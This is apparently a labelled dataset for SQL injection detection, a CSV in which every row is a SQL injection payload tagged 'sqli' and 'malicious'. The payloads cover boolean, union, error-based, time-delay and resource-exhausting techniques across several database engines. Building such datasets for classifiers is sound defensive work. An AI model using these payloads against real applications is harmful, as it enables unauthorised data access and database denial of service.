payload,type,label
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- knpw,sqli,malicious
"1%"";select (case when (7019=1998) then 7019 else 7019*(select 7019 from mysql.db) end)#",sqli,malicious
"-7743"" or 9323=9323#",sqli,malicious
1')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,malicious
"-2263') where 7931=7931 union all select 7931,7931,7931--",sqli,malicious
"1"") where 1807=1807;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,malicious
-2784) where 5261=5261 or 3472=1728#,sqli,malicious
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('czqk' like 'czqk,sqli,malicious
-3648' where 4629=4629 order by 1--,sqli,malicious
"1',(case when 3598=2118 then 1 else null end)",sqli,malicious
"1') where 1600=1600 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"1'+(select 'zxxh' where 4065=4065 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"1"")) as ccjk where 1932=1932 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
1')) and (select * from (select(sleep(5)))fzno) and (('vpqr'='vpqr,sqli,malicious
"-3074')) union all select 6131,6131,6131,6131,6131,6131,6131--",sqli,malicious
"1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,malicious
"1'||(select 'bnaz' from dual where 7168=7168 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
"1,iif(7475=7475,1,1/0)",sqli,malicious
"1')) as ewyk where 4828=4828 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,malicious
"-3596') union all select 5349,5349,5349,5349,5349,5349#",sqli,malicious
1%' and 9198=9198--,sqli,malicious
"(select concat(0x7171706a71,(select (elt(7381=7381,1))),0x717a767a71))",sqli,malicious
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bkcs'='bkcs",sqli,malicious
1) and 5196=9002,sqli,malicious
"1%""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"-1084 where 1181=1181 or make_set(9354=9354,7185)--",sqli,malicious
"1%"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",sqli,malicious
-5152')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('jumr' like 'jumr,sqli,malicious
"1' where 5251=5251 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,malicious
"-4480') where 4661=4661 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,malicious
"1') where 1577=1577 union all select null,null,null,null,null,null#",sqli,malicious
"1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+'",sqli,malicious
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'pphf'='pphf",sqli,malicious
"1%'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",sqli,malicious
-6233') where 9820=9820 or 3038=3038,sqli,malicious
1') where 3588=3588;begin user_lock.sleep(5); end--,sqli,malicious
-3107') where 7782=7782 or 8571=8571--,sqli,malicious
1') and 1987=3756#,sqli,malicious
1' where 2145=2145;select sleep(5)#,sqli,malicious
1)) and sleep(5) and ((9084=9084,sqli,malicious
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""vzft""=""vzft",sqli,malicious
"1%')));iif(5257=5257,1,1/0)",sqli,malicious
"-7749"" or (2689=7481)*7481",sqli,malicious
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)# yrpn",sqli,malicious
1' and 1661=1244 and 'dcha'='dcha,sqli,malicious
"1"") where 5065=5065;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,malicious
"1""));select count(*) from generate_series(1,5000000)--",sqli,malicious
-6487) or 6872=6872 and (7688=7688,sqli,malicious
"-4305) as ldrt where 2567=2567 union all select 2567,2567,2567,2567,2567,2567,2567#",sqli,malicious
"1)) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((8867=8867",sqli,malicious
"1' where 7613=7613;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,malicious
1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--,sqli,malicious
1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,sqli,malicious
"-1376%""))) or 3458=9503 and (((""%""=""",sqli,malicious
-6129) as vuze where 1565=1565 or (8459=8459)*4906--,sqli,malicious
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,malicious
1')));if(3245=6168) select 3245 else drop function nafj--,sqli,malicious
"-3707""))) or 8571=8571--",sqli,malicious
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,malicious
"-4047'||(select 'rqta' from dual where 9743=9743 union all select 9743,9743,9743#",sqli,malicious
1') as uwmy where 6980=6980;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,malicious
"1%"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,malicious
"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",sqli,malicious
"1'||(select 'zifu' from dual where 4822=4822 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,malicious
1) as ozga where 4002=4002 and 6969=(select 6969 from pg_sleep(5))--,sqli,malicious
1');select pg_sleep(5) and ('itgc'='itgc,sqli,malicious
"1%""));select * from generate_series(2382,2382,case when (2382=4352) then 1 else 0 end) limit 1--",sqli,malicious
1);begin user_lock.sleep(5); end,sqli,malicious
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('jylk'='jylk",sqli,malicious
"-7884"" where 3297=3297 or 2492=6158",sqli,malicious
1)) as lkqx where 6468=6468 or (select * from (select(sleep(5)))sddo)#,sqli,malicious
1) where 9344=9344;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,malicious
1');waitfor delay '0:0:5',sqli,malicious
1') or 4240=(select 4240 from pg_sleep(5))--,sqli,malicious
"-3126)) union all select 6718,6718,6718,6718,6718--",sqli,malicious
"1')) as efmy where 7299=7299 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"-9361"")) union all select 3112#",sqli,malicious
1'));(select * from (select(sleep(5)))srmq) and (('nbzf' like 'nbzf,sqli,malicious
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and 'zlxw'='zlxw",sqli,malicious
"1'||(select 'baur' from dual where 9384=9384 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,malicious
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lmoh' like 'lmoh",sqli,malicious
1' where 4115=4115;select (case when (2501=4688) then 2501 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,malicious
"1"") where 1144=1144 and 2006=2006",sqli,malicious
1%')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,malicious
1' and (5116=1602)*1602,sqli,malicious
"1%"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",sqli,malicious
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'mnbg' like 'mnbg",sqli,malicious
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('drvk' like 'drvk",sqli,malicious
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',sqli,malicious
"-5041'))) union all select 4820,4820,4820,4820,4820,4820--",sqli,malicious
1') where 7903=7903;select (case when (8841=9675) then 8841 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,malicious
1') as bihs where 4197=4197;select pg_sleep(5)--,sqli,malicious
"1')));iif(1149=4765,1,1/0)",sqli,malicious
"1%"");select count(*) from generate_series(1,5000000) and (""%""=""",sqli,malicious
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,malicious
"1')) union all select null,null,null--",sqli,malicious
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""gvlc"" like ""gvlc",sqli,malicious
"1'||(select 'ukfj' where 7133=7133 union all select null,null,null#",sqli,malicious
"1'||(select 'ufgs' where 9670=9670 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",sqli,malicious
"-9487)) as rvck where 9404=9404 or make_set(8921=6045,6045)--",sqli,malicious
"1%"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",sqli,malicious
"1%')) or 8421=(select count(*) from generate_series(1,5000000)) and (('%'='",sqli,malicious
"1"") union all select null,null,null,null--",sqli,malicious
"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",sqli,malicious
1')) and 4595=4595#,sqli,malicious
"1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs",sqli,malicious
"-8073))) union all select 4481,4481,4481,4481--",sqli,malicious
1%')) and (select * from (select(sleep(5)))fzno) and (('%'=',sqli,malicious
"1'||(select 'kfyh' where 4737=4737 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",sqli,malicious
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",sqli,malicious
"-4522"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mbkq""=""mbkq",sqli,malicious
1%' and 4595=4595#,sqli,malicious
"1')) as wdor where 7426=7426;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,malicious
-9456%'))) order by 1#,sqli,malicious
"1');iif(5257=5257,1,1/0)",sqli,malicious
"1' in boolean mode) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)#",sqli,malicious
-6298' or 4724=4876,sqli,malicious
"-1876'||(select 'itfc' from dual where 9584=9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",sqli,malicious
"1'||(select 'ymez' from dual where 9870=9870 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"1)));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,malicious
"1') where 6274=6274 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,malicious
"1"" where 3933=3933 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,malicious
"1%"") waitfor delay '0:0:5'--",sqli,malicious
"1%"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,malicious
"1') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,malicious
-5389'||(select 'gggl' where 1020=1020 union all select 1020#,sqli,malicious
"1"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,malicious
-1190' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'yxry' like 'yxry,sqli,malicious
"1"") or elt(5873=5873,sleep(5))#",sqli,malicious
-6100') as kvfc where 2377=2377 or 6872=6872--,sqli,malicious
"1%""))) union all select null,null#",sqli,malicious
"-9634'))) union all select 4141,4141#",sqli,malicious
"1%""));select benchmark(5000000,md5(0x4c4d6142)) and ((""%""=""",sqli,malicious
"1%') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('%'='",sqli,malicious
"1"" where 9461=9461;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,malicious
1%')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('%'=',sqli,malicious
"1)) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((7200=7200",sqli,malicious
"1) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,malicious
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))-- kegk",sqli,malicious
1') where 2227=2227;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,malicious
"1 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,malicious
-5470')) or (8459=8459)*4906 and (('oeam'='oeam,sqli,malicious
"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,malicious
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('opyp'='opyp,sqli,malicious
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cbwx'='cbwx",sqli,malicious
1 and (3020=3020)*6703-- zsnl,sqli,malicious
"-9861' union all select 5710,5710,5710,5710,5710--",sqli,malicious
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,sqli,malicious
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",sqli,malicious
"1%""))) union all select null,null,null,null,null,null,null#",sqli,malicious
"1"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,malicious
"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",sqli,malicious
"1') where 9516=9516;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,malicious
-9340) where 5462=5462 or 3038=3038,sqli,malicious
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,malicious
"-2006')) union all select 7852,7852,7852,7852,7852--",sqli,malicious
1'+(select wpkh where 5842=5842;select sleep(5))+',sqli,malicious
1%')) rlike sleep(5) and (('%'=',sqli,malicious
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""zgoy"" like ""zgoy",sqli,malicious
"1'||(select 'hvqw' from dual where 4423=4423 union all select null,null,null--",sqli,malicious
1') as dqgr where 2427=2427 and (3020=3020)*6703--,sqli,malicious
"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",sqli,malicious
"1' in boolean mode) union all select null,null,null,null,null,null#",sqli,malicious
"1%"" or sleep(5)#",sqli,malicious
1' union all select null--,sqli,malicious
"1%"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""%""=""",sqli,malicious
1';waitfor delay '0:0:5'--,sqli,malicious
-9331' or (4519=2912)*2912 and 'rddk'='rddk,sqli,malicious
"1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,malicious
